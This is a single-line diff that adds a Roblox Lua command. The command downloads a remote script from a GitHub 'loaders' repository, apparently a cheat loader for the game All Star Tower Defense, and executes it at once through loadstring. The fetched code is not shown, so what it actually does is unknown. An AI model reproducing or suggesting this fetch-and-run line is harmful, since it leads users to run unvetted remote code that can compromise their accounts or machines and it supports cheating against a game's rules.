@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/og-all-star-tower-defense-spam5-8aqiyr01jmpb43.lua"))()
